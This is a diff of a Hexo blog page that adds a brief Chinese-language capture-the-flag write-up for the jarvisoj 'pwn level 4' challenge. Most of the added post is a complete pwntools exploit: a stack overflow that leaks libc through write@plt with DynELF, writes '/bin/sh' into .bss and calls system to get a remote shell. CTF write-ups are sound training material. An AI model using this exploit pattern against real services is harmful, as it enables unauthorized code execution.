@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>Tags - jarvisoj ~ Hexo</title>
+  <title>jarvisoj pwn level 4 ~ Hexo</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -39,7 +39,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -113,6 +113,41 @@
             </span>
 
             
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Thursday, January 30th 2020, 11:56 am
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    166 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      1 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
           </div>
 
           
@@ -123,36 +158,78 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5 z-depth-3" id="board">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-<!--  <p class="h4">1 posts in total.</p>-->
-  <hr>
-  
-    
       
-      <p class="h5">2020</p>
-    
-    <a href="/2020/01/29/jarvisoj-pwn-level-2/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">jarvisoj pwn level 2</span>
-      <span style="float: right;">01-29</span>
-    </a>
-  
-</div>
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>checksec 是x86的题目用IDA打开没有libc文件，通过查询知道了一个DynELF，可以泄露出libc从哪里开始的。<br>下面是EXP：</p>
+<pre><code>from pwn import *
 
+re = remote(&quot;pwn2.jarvisoj.com&quot;,9880)
+elf = ELF(&#39;./level4&#39;)
+write_plt = elf.symbols[&#39;write&#39;]
+vul_addr=0x804844b
+bss_addr=0x0804a024
 
-              </div>
-            </div>
+def leak(address):
+        payload = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)
+        re.sendline(payload)
+        data = re.recv(4)
+        return data
+wow = DynELF(leak,elf=elf)
+system_addr = wow.lookup(&#39;system&#39;,&#39;libc&#39;)
+read_plt = elf.symbols[&#39;read&#39;]
+
+payload2 = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(read_plt) + p32(vul_addr) + p32(1) + p32(bss_addr) + p32(8)
+re.sendline(payload2)
+re.send(&#39;/bin/sh\x00&#39;)
+payload3 = &#39;a&#39;*0x88 +&#39;a&#39;*4 + p32(system_addr) +p32(0) + p32(bss_addr)
+re.sendline(payload3)
+re.interactive()</code></pre>
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+            </p>
+            
           </div>
         </div>
       </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+
+    
+  </div>
+</div>
+
     
   </main>
 
@@ -227,6 +304,11 @@
 
 
 
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
 
 
   <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
@@ -267,7 +349,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Tag - jarvisoj&nbsp;",
+        "jarvisoj pwn level 4&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
